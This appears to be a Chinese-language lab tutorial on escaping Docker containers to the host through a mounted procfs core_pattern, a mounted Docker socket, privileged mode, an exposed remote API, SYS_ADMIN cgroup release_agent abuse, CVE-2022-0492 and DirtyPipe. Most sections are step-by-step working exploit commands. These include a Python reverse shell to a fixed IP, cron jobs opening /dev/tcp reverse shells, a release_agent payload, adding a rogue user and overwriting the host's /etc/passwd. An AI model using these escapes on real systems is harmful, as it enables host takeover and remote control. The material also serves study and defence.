## Docker容器挂载 (伪文件系统)procfs 逃逸

`procfs`是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时(Docker默认是不会做用户隔离)。

利用文件`/proc/sys/kernel/core_pattern`它在Linux系统中，如果进程崩溃了，系统内核会捕获到进程崩溃信息，将进程崩溃信息传递给这个文件中的程序或者脚本。

> 从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符'|'，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。

### 环境

```
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu #搭建环境

find / -name core_pattern 2>/dev/null | wc -l | grep -q 2 && echo "Procfs is mounted." || echo "Procfs is not mounted." #检测当前容器是否挂载procfs
```

![image-20240122201502815](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240122201502815.png)

### 利用

+ 安装gcc

  ```
  apt update && apt install -y gcc
  ```

+ 创建一个用于反弹shell的python文件

  ```python
  #!/usr/bin/python3
  import  os
  import pty
  import socket
  lhost = "192.168.59.128"
  lport = 4444
  def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((lhost, lport))
     os.dup2(s.fileno(), 0)
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
     os.putenv("HISTFILE", '/dev/null')
     pty.spawn("/bin/bash")
     # os.remove('/tmp/.t.py')
     s.close()
  if __name__ == "__main__":
     main()
  ```

+ 赋予shell权限

  ```
  chmod 777 .t.py
  ```

+ 设置环境变量

  ```
  host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
  ```

  > 因为Linux转储机制对/proc/sys/kernel/core_pattern内程序的查找是在宿主机文件系统进行的。所以从/etc/mtab中提取upperdir，此路径指向容器在宿主机文件中的挂载点，容器内文件系统未提交变动的文件都会在此体现。（最后来解释）

+ 写入反弹shell到目标proc目录下

  ```shell
  echo -e "|$host_path/tmp/.t.py \rcore" > /host/proc/sys/kernel/core_pattern
  #如果这里写的不对，可以尝试找绝对路径来写
  cat /proc/mounts | xargs -d ',' -n 1 | grep workdir
  #workdir=/var/lib/docker/overlay2/895c10fa35d2baddf5230d5051fd48f9246d19ef027403c6ab8093600fc0395b/work 0 0
  #所以绝对路径应该是/var/lib/docker/overlay2/895c10fa35d2baddf5230d5051fd48f9246d19ef027403c6ab8093600fc0395b/merged
  echo -e "|/var/lib/docker/overlay2/895c10fa35d2baddf5230d5051fd48f9246d19ef027403c6ab8093600fc0395b/merged/tmp/.t.py \rcore" > /host/proc/sys/kernel/core_pattern
  ```

+ 在容器里运行一个可以崩溃的程序

  ```c
  #include<stdio.h>
  int main(void)  {
     int *a  = NULL;
     *a = 1;
     return 0;
  }
  # 编译程序并执行
  gcc t.c -o t && ./t
  ```

  ![image-20240122210529691](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240122210529691.png)

集中解释一下问题

> 需要理解的是linux核心转储这个机制
>
> 1.Linux转储机制对/proc/sys/kernel/core_pattern内程序的查找是在宿主机文件系统进行的
>
> `/proc/sys/kernel/core_pattern`是一个内核参数，它决定了core dump文件的生成位置和命名方式。这个查找过程是在宿主机的文件系统上进行的，而不是在容器中的文件系统。
>
> 在这个案例中，我们将其换成了shell文件，并且在初始添加了管道符，这个shell文件将会在宿主机当中被当成程序执行
>
> 2.从/etc/mtab中提取upperdir，此路径指向容器在宿主机文件中的挂载点，容器内文件系统未提交变动的文件都会在此体现。
>
> `upperdir`是Docker覆盖文件系统（overlay filesystem）中的一个概念，它指容器层的文件系统，用于存放容器内的更改。`/etc/mtab`文件中记录了系统中所有已经挂载的文件系统，从中可以找到`upperdir`的挂载信息，也就找到了容器在宿主机中的数据存放位置。
>
> 其实也就是寻找当前容器的文件存储在宿主机的哪个位置
>
> 3.关于.t.py
>
> 为了更好的隐藏文件，大概是

## 挂载Docker Socket逃逸

Docker Socket 用来与守护进程通信即查询信息或者下发命令。

### 环境

+ 创建一个容器并挂载/var/run/docker/sock

  ```
  docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu
  ```

  在容器内安装 Docker 命令行客户端

  ```shell
  docker exec -it with_docker_sock /bin/bash
  apt-get update
  apt-get install curl
  curl -fsSL https://get.docker.com/ | sh
  ```

### 检测

```shell
ls /var/run/ | grep -qi docker.sock && echo "Docker Socket is mounted." || echo "Docker Socket is not mounted."
```

### 利用

在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部

```
docker run -it -v /:/host ubuntu /bin/bash
```

在新的容器内执行 chroot，将根目录切换到挂载到宿主机的根目录，其实不挂载也行

```
chroot /host
```

> Docker Socket主要作用是在Docker守护进程（Docker Daemon）与Docker客户端之间进行通信。
>
> 当容器挂载了Socket，能够执行docker的一些命令，例如创建新的容器，这个操作是在docker服务器上进行的
>
> 因此，利用了这一点将宿主机的全部目录挂载进来，相当于有了宿主机的文件操作权，可以写计划任务来反弹shell了
>
> 这个逃逸需要root权限

## 特权容器逃逸

### 环境

```
docker run --rm -it --privileged ubuntu  bash 
```

以特权模式启动一个容器

### 检测

```shell
cat /proc/self/status | grep -qi "00000[1,3]fffffffff" && echo "Is privileged mode" || echo "Not privileged mode"
```

![image-20240124132243071](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240124132243071.png)

### 利用

```
fdisk -l #查看磁盘文件
root@4e4245eaefd2:/# fdisk -l
Disk /dev/sda: 80.1 GiB, 86000000000 bytes, 167968750 sectors
Disk model: VMware Virtual S
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x4a7def5b

Device     Boot Start       End   Sectors  Size Id Type
/dev/sda1  *     2048 167968749 167966702 80.1G 83 Linux

2.将/dev/sda1挂载到当前容器的目录下，进行写操作
mkdir /test
mount /dev/sda1 /test

3.写入计划任务
echo '* * * * * bash -i >& /dev/tcp/192.168.59.128/4444 0>&1' >> /test/var/spool/cron/root
```

或者通过添加新用户登录

```
mount /dev/sda1 /mnt
chroot /mnt adduser hacker
```

### 骚姿势

```
# 选择一个包含release_agent的cgroup子系统控制器。
cgroup_dir=/sys/fs/cgroup/rdma

# 在其中创建一个子系统test_subsystem。
mkdir -p $cgroup_dir/test_subsystem

# 将test_subsystem子系统中的notify_on_release配置为1。
echo 1 >$cgroup_dir/test_subsystem/notify_on_release

# 从/etc/mtab中提取此路径指向宿主机的挂载点。
host_overlay2_fs_dir=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /etc/mtab)

# 在容器根目录下创建payload文件并写入执行脚本(Payload)。
echo '#!/bin/sh' > /payload
# 在容器根目录下创建payload文件并写入执行脚本(Payload)。
echo "touch /hacker-privileged" >> /payload
# 给payload增加执行权限。
chmod a+x /payload

# 将host_overlay2_fs_dir与payload目录拼接，目的是在notify_on_release运行时指向容器外的宿主机中的payload文件
echo "$host_overlay2_fs_dir/payload" > $cgroup_dir/release_agent

# 将一个执行即退出的进程触发notify_on_release。
sh -c "echo \$\$ > $cgroup_dir/test_subsystem/cgroup.procs"
```

> 在特权模式下，容器内部可以执行任意系统调用，/sys和/proc路径都是可写的，容器可以获取真实的进程ID，用户ID，组ID等信息，还可以使用chroot等系统调用来改变容器环境。

## 远程API未授权访问逃逸

使用Docker Swarm时，管理的docker 节点上便会开放一个TCP端口2375/2376，绑定在0.0.0.0上，http访问会返回 404 page not found。这是 Docker RemoteAPI，可以执行docker命令，比如访问 http://x.x.x.x:2375/containers/json 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成。

### 环境

在配置Docker启动文件时，添加了允许任何网段访问`Docker Remote API`。

![image-20240124142843398](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240124142843398.png)

### 检测

```
IP=`hostname -i | awk -F. '{print $1 "." $2 "." $3 ".1"}' ` && timeout 3 bash -c "echo >/dev/tcp/$IP/2375" > /dev/null 2>&1 && echo "Docker Remote API Is Enabled." || echo "Docker Remote API is Closed."
```

![image-20240124143031312](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240124143031312.png)

### 利用

```
docker -H tcp://192.168.59.128:2375 run -it -v /:/mnt nginx:latest /bin/bash
```

在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/root

```
echo '* * * * * /bin/bash -i >& /dev/tcp/192.168.59.128/4444 0>&1' >> /mnt/var/spool/cron/crontabs/root
```

> 利用这个方法，需要知道docker服务所在的ip
>
> 由于容器内无法执行docker操作，所以重新下载了docker.io

![image-20240124145812000](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240124145812000.png)

## SYS_Admin容器逃逸

### 条件

如果一个Docker容器的启动方式满足以下条件，攻击者在容器中就可以逃逸到宿主机上。

1. 以root用户的身份在容器内运行；
2. 容器启用`SYS_ADMIN` `Capability`；（linux的权限划分机制）
3. 容器没有启用Docker默认的`AppArmor`配置文件docker-default，或者AppArmor允许运行`mount syscall`

### 环境

```shell
docker run --rm -it --security-opt apparmor=unconfined --cap-add=SYS_ADMIN ubuntu bash

--cap-add=SYS_ADMIN表示给Docker容器SYS_ADMIN的Capability。
--security-opt apparmor=unconfined表示去除Docker默认的AppArmor配置(CentOS和Red Hat上可不添加此参数)。
```

### 检测

```
# apt update && apt install libcap2-bin -y
capsh --print|grep -qi cap_sys_admin && echo 'SYS_ADMIN is exist!' || echo 'SYS_ADMIN is Not exist!'
```

### 利用

POC1

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
//在容器里创建一个临时目录/tmp/cgrp，并使用mount命令将系统默认的memory类型的cgroup重新挂载到/tmp/cgrp上
echo 1 > /tmp/cgrp/x/notify_on_release
//设置参数
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
//获取docker容器在宿主机上的存储路径
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "sh -i >& /dev/tcp/192.168.59.128/4444 0>&1" >> /cmd
chmod a+x /cmd
//POC将要执行的shell写到cmd文件里，并赋予执行权限
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
//将一个执行即退出的进程ID写入到此cgroup子系统的cgroup.procs中去触发notify_on_release
```

如果你出现mount的错误，这是因为你的配置中没有RDMA cgroup控制器，尝试将rdma更改为memory来修复它

> 在 Linux cgroup 中，`notify_on_release` 是一个特性标志，当其设置为1（启用）时，当 cgroup 中的最后一个任务（进程）结束（退出或附加到其它 cgroup）时，就会触发一个事件。此事件通常是执行一个事先设置好的 `release_agent` 脚本
>
> 我们利用这个特性，将脚本修改为我们执行的命令
>
> 在我看来，这也是特权逃逸的一种，没有复现成功，添加--privileged也无济于事

## CVE-2022-0492

这是在内核中新发现的一个权限提升漏洞。据公告称，该漏洞是由于control groups（cgroups）中的一个逻辑错误所致；

虽然SYS_ADMIN逃逸同样利用到release_agent这个特性，不过并不需要SYS_ADMIN的特权，**只需要**关闭Docker默认开启的两大安全特性：`AppArmor`和`Seccomp`就可以成功利用了

### 条件

 Linux Kernel >= 5
 Linux Kernel <= 5.15.26
 Docker >= 20.10.14

### 环境

```shell
docker run -ti --rm --security-opt apparmor=unconfined --security-opt seccomp=unconfined ubuntu bash
```

### 利用

```shell
# 通过unshare创建新的Namespace，隔离用户、映射root用户、隔离mount和cgroup并运行bash。
unshare -UrmC --propagation=unchanged bash
# 增加挂载cgroups文件系统操作
mkdir /tmp/cgroup && mount -t cgroup -o rdma cgroup /tmp/cgroup
# 修改cgroup_dir对应目录路径
cgroup_dir=/tmp/cgroup
mkdir -p $cgroup_dir/boysec
echo 1 >$cgroup_dir/boysec/notify_on_release
host_overlay2_fs_dir=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo '#!/bin/sh' > /script
echo "touch /hacked_by_boysec" >> /script
echo "$host_overlay2_fs_dir/script" > $cgroup_dir/release_agent
chmod a+x /script

sh -c "echo \$\$ > $cgroup_dir/boysec/cgroup.procs"
```

## CVE-2022-0847(脏管道逃逸)

CVE-2022-0847-DirtyPipe-Exploit 是存在于 Linux 内核 5.8 及之后版本中的本地提权漏洞。

攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root

这个内核漏洞同样可用于docker逃逸

### 条件

高于 5.8 的 Linux 内核版本会受到影响

到目前为止，该漏洞已在以下 Linux 内核版本中**修复**：

 Linux Kernel 5.16.11以上

 Linux Kernel 5.15.26以上

 Linux Kernel 5.10.102以上

### 环境

```
docker run --rm -it -v $(pwd):/exp --cap-add=CAP_DAC_READ_SEARCH ubuntu
```

### 检测

```
# apt update && apt install libcap2-bin -y
capsh --print |grep -i cap_dac_read_search && echo 'CVE-2022-0847 is exist!' || echo 'CVE-2022-0847 is Not exist!'
```

### 利用

```
/exp/dp /etc/passwd 1 ootz: # overwrite /etc/password on host from offset 1
/etc/dp /etc/passwd # dump /etc/passwd on host
```

> 通过利用`CAP_DAC_READ_SEARCH`与脏管道可以实现覆盖主机文件, 实际上主要是`CAP_DAC_READ_SEARCH`可以调用`open_by_handle_at`, 可以获得主机文件的文件描述符，配合脏管道于是就可以修改主机文件。
>
> 不过该逃逸有个缺点，覆盖文件的第一个字节无法修改，可以写计划任务

